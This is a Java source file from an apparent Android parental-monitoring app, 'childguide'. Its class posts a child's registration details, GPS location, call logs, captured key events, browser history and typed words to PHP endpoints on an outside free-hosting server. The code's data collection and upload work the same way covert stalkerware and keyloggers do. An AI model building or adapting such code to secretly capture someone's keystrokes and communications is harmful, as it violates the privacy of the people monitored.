package cybertech.childguide;

import com.android.volley.Response;
import com.android.volley.toolbox.StringRequest;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 * stagent24@gmail.com
 * http://localhost/childguide/prepared.php
 * "https://fabiangare.000webhostapp.com/uploadEvents.php"
 * "https://fabiangare.000webhostapp.com/uploadcallLogs.php"
 * http://192.168.43.86/childguide/prepared.php
 * Created by CyberTech on 6/4/2013.
 */
public class ChildConnection extends StringRequest {
    private static final String REG_URL = "https://fabiangare.000webhostapp.com/register.php";
    private static final String LOCATION_URL = "https://fabiangare.000webhostapp.com/uploadLocation.php";
    private static final String CALL_LOG_URL = "https://fabiangare.000webhostapp.com/uploadcallLogs.php";
    private static final String BROWSER_HISTORY_URL = "https://fabiangare.000webhostapp.com/uploadBrowserhistorys.php";
    private static final String USED_WORD_URL = "https://fabiangare.000webhostapp.com/uploadUsedwords.php";
    private static final String KEY_EVENT_URL = "https://fabiangare.000webhostapp.com/prepared.php";
    Map<String, String> params;

    //for registering a Child to the server.
    public ChildConnection(String ChildID, String name, String phoneNO, String email, Response.Listener<String> listener) {
        super(Method.POST, REG_URL, listener, null);
        params = new HashMap<>();
        params.put("childid", ChildID);
        params.put("name", name);
        params.put("phoneno", phoneNO);
        params.put("email", email);

    }

    // for sending location to server.
    public ChildConnection(String ChildID, String latitude, String longitude, Response.Listener<String> listener, String time) {
        super(Method.POST, LOCATION_URL, listener, null);
        params = new HashMap<>();
        params.put("childid", ChildID);
        params.put("latitude", latitude);
        params.put("longitude", longitude);
        params.put("time", time);
    }

    // for sending call logs to the server.
    public ChildConnection(String ChildID, StringBuilder name, Response.Listener<String> listener) {
        super(Method.POST, CALL_LOG_URL, listener, null);
        String date = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss a").format(new Date());
        params = new HashMap<>();
        params.put("childid", ChildID);
        params.put("name", name.toString());
        params.put("phoneno", "");
        params.put("time", date);
        params.put("type", "");
        params.put("duration", "");
    }


    // for sending Key events to the sever.
    public ChildConnection(String ChildID, Response.Listener<String> listener, StringBuilder body) {
        super(Method.POST, KEY_EVENT_URL, listener, null);
        String date = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss a").format(new Date());
        params = new HashMap<>();
        params.put("childid", ChildID);
        params.put("type", "");
        params.put("time", "");
        params.put("time", date);
        params.put("body", body.toString());
    }

    // for sending Browser Histories to server.
    public ChildConnection(String ChildID, String searchword, String site, Response.Listener<String> listener) {
        super(Method.POST, BROWSER_HISTORY_URL, listener, null);
        params = new HashMap<>();
        params.put("childid", ChildID);
        params.put("search", searchword);
        params.put("site", site);
        params.put("time", " ");
    }

    // for sending used words to server.
    public ChildConnection(String ChildID, String usedWord, String uesdIn, Date time) {
        super(Method.POST, USED_WORD_URL, null, null);
        String date = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss a").format(time);
        params = new HashMap<>();
        params.put("childid", ChildID);
        params.put("wordused", usedWord);
        params.put("usedin", uesdIn);
        params.put("time", date);

    }

    @Override
    public Map<String, String> getParams() {
        return params;
    }
}
